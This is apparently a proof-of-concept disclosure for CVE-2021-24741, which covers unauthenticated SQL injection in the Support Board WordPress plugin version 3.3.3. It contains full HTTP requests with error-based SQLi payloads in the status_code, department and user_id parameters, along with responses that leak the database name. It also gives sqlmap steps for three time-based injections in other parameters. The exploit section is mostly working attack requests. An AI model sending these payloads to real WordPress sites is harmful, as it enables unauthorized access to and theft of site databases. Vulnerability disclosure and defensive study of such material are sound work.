# CVE-2021-24741

#### Multiple SQL Injection (Unauthenticated) in Support Board v 3.3.3

####  Description
```
Support Board V 3.3.3
Multiple SQL Injection Vulnerability in Support Board Version 3.3.3 that allow remote unauthenticated attacker to execute arbitrary SQL commands via status_code, department, user_id, conversation_id, conversation_status_code, and recipient_id parameters to ajax.php which is connected to functions.php which the vulnerability is present.
```

#### Vulnerable Parameters

| **Function** | **Vulnerable Parameter** | **Injection Type** |
:--- | :--- | :---
| new-conversation | status_code | Error Based |
| new-conversation | department | Error Based |
| send-message | user_id | Error Based |
| send-message | conversation_id | Time Based |
| send-message | conversation_status_code | Time Based |
| send-message | recipient_id | Time Based |

#### Exploit 

### PoC1 : Error Based SQLi (status_code)

Request 
```
POST /wp-content/plugins/supportboard/supportboard/include/ajax.php HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 882
Origin: https://TARGET.com
Connection: close
Referer: https://TARGET.com
Cookie: sb-updates=3.3.3; sb-login=

function=new-conversation&status_code=2"+AND+EXTRACTVALUE(4597,CONCAT("","DB+Name:+",(SELECT+(ELT(4597=4597,""))),database()))+AND+"fKoo"="fKoo&title=&department=&agent_id=&routing=false&login-cookie=&user_id=46&language=false
```
Response 
```
HTTP/1.1 200 OK

Date: Sat, 28 Aug 2021 18:58:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
vary: Accept-Encoding
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
strict-transport-security: max-age=31536000; includeSubDomains
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=7jx%2B3idpDKEIdWokVp8zt1WD3J64SNohgLzr8wG0%2FYt44Hh1ieE3BpnnoRhc7aiPoGPnajoyWIeRykJZ2sYx4pDvl6TQErTS%2FoSAq2ovqRIk0sNOzOw84Xw%2BnmbTt4p5rFjE4%2F%2Bv"}],"group":"cf-nel","max_age":604800}
NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
CF-RAY: 685fc52cfdc704ff-LAX
alt-svc: h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400, h3=":443"; ma=86400

Content-Length: 84
["error","db-error","sb_db_query","XPATH syntax error: 'Name: VULNERABLE_DB'"]
```

### PoC2 : Error Based SQLi (department)
Request

```
POST /wp-content/plugins/supportboard/supportboard/include/ajax.php HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 882
Origin: https://TARGET.com
Connection: close
Referer: https://TARGET.com
Cookie: sb-updates=3.3.3; sb-login=

function=new-conversation&status_code=2o&title=&department=(UPDATEXML(5632,CONCAT(0x2e,"Database+Name:+",(SELECT+(ELT(5632=5632,""))),database()),3004))&agent_id=&routing=false&login-cookie=&user_id=46&language=false
```
Response

```
HTTP/1.1 200 OK
Date: Sat, 28 Aug 2021 19:13:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
vary: Accept-Encoding
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
strict-transport-security: max-age=31536000; includeSubDomains
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=7%2BL82UPHELAmWNdiuLOzhsdym4B4JdI07PQtRZzBDqONnB0BJshT45SglIlz0F6md0QH%2B6YfNWxc%2BNItIJKK9QAZOwMOFrgM5okXHOQcm%2FsehlPeSmT6%2BsSfI3MkgxYalCzmezVp"}],"group":"cf-nel","max_age":604800}
NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
CF-RAY: 685fdac8cd2fd1af-HKG
alt-svc: h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400, h3=":443"; ma=86400
Content-Length: 91

["error","db-error","sb_db_query","XPATH syntax error: 'Database Name: VULNERABLE_DB'"]
```
### PoC 3: Error Based SQLi (user_id)

Request
```
POST /wp-content/plugins/supportboard/supportboard/include/ajax.php HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 1044
X-Requested-With: XMLHttpRequest
Origin: TARGET
Referer: https://TARGET/wp-content/plugins/supportboard/supportboard/admin.php?conversation=-1
Connection: close
Cookie: sb-updates=3.3.3; sb-login=

function=send-message&user_id=-5"+AND+GTID_SUBSET(CONCAT("Database+Name:+",(SELECT+(ELT(3919=3919,""))),database()),3919)+AND+"wrOJ"="wrOJ&conversation_id=35&message=TEST+POC&conversation_status_code=false&queue=false&payload=false&recipient_id=30&login-cookie=&language=false
```

Response
```
HTTP/1.1 200 OK

Date: Mon, 23 Aug 2021 15:12:14 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
vary: Accept-Encoding
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
strict-transport-security: max-age=31536000; includeSubDomains
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=geY0cx80cnOpGXxsoeebXh15IbI3NqHun6JzLhfZrSsTTJ7Vsx15Qwyp5K%2FW7DITdGVhFxoI%2FLarUmetvQIhPCvsCLkO8tiNqb64ulu6BNf2XlkPUqviZOgSwUhHZDJVx%2Bo%3D"}],"group":"cf-nel","max_age":604800}
NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
CF-RAY: 6835472c4b1a24bf-HKG
alt-svc: h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400, h3=":443"; ma=86400

Content-Length: 103
["error","db-error","sb_db_query","Malformed GTID set specification 'Database Name: VULNERABLE_DB'."]
```

### PoC 4: Time Based (conversation_id)

we are going to use sql map for exploiting Time Based
so we are going to save the request from the repeater to as a req file then use sqlmap to scan the request to find the conversation_id parameter is vulnerable to time based

Found the conversation_id parameter is vulnerable

![vulnerable_param_conversation_id](./pictures/conversation_id_vuln.png)

Payload found in sqlmap:

![payload_conversation_id](./pictures/payload_conversation_id.png)

### PoC 5 : Time Based (conversation_status_code)

we are going to use sql map for exploiting Time Based
so we are going to save the request from the repeater to as a req file then use sqlmap to scan the request to find the conversation_status_code parameter is vulnerable to time based

Found the conversation_status_code parameter is vulnerable

![vulnerable_param_conversation_status_code](./pictures/conversation_status_vuln.png)

Payload found in sqlmap:

![payload_conversation_status_code](./pictures/payload_conversation_status_code.png)

### PoC 6 : Time Based (recipient_id)

we are going to use sql map for exploiting Time Based
so we are going to save the request from the repeater to as a req file then use sqlmap to scan the request to find the recipient_id parameter is vulnerable to time based

Found the recipient_id parameter is vulnerable

![vulnerable_param_recipient_id](./pictures/recipient_id_vuln.png)

Payload found in sqlmap:

![payload_recipient_id](./pictures/payload_recipient_id.png)
